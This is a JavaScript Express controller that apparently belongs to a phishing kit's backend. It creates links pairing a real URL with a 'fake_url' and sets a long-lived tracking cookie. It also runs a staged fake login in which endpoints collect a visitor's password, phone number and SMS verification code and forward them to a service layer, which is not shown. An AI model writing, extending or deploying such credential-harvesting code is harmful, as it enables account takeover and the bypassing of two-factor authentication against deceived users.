const logic = require("../utils/logic");
const Response = require("../responses/response");
const linkService = require("../services/link-service");

class LinkController {
  async create(req, _, next) {
    try {
      const { url, fake_url, tag } = req.body;
      if (logic.regexobject({ url, fake_url, tag }))
        throw Response.BadRequest("Expected data not validated");
      const res = await linkService.create(url, fake_url);

      return next(res);
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async get(req, _, next) {
    try {
      const { linkId } = req.query;
      if (logic.regexobject({ linkId }))
        throw Response.BadRequest("Expected data not validated");
      const res = await linkService.get(linkId);
      _.cookie("linkId", res.json.id, {
        maxAge: 30 * 24 * 60 * 60 * 1000,
        httpOnly: true,
      });
      return next(res);
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async initializeLoginProcess(req, _, next) {
    try {
      const { visitorId, device, platform } = req.body;
      if (logic.regexobject({ visitorId }))
        throw Response.BadRequest("Expected data not validated");

      const res = await linkService.initializeLoginProcess(
        visitorId,
        req.useragent.source,
        device,
        platform
      );
      return next(res);
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async send2FA(req, _, next) {
    try {
      const { visitorId, pass } = req.body;
      if (logic.regexobject({ visitorId, pass }))
        throw Response.BadRequest("Expected data not validated");

      const res = await linkService.send2FA(visitorId, pass);
      return next(res);
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async sendCode(req, _, next) {
    try {
      const { visitorId, phone } = req.body;
      if (logic.regexobject({ visitorId, phone }))
        throw Response.BadRequest("Excepted data not validated");

      const res = await linkService.sendCode(visitorId, phone);
      return next(res);
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }

  async verify(req, _, next) {
    try {
      const { visitorId, phone, code } = req.body;
      if (logic.regexobject({ visitorId, phone, code }))
        throw Response.BadRequest("Excepted data not validated");
      const res = await linkService.verify(visitorId, phone, code);
      return next(res);
    } catch (e) {
      console.error(e);
      return next(e);
    }
  }
}

module.exports = new LinkController();
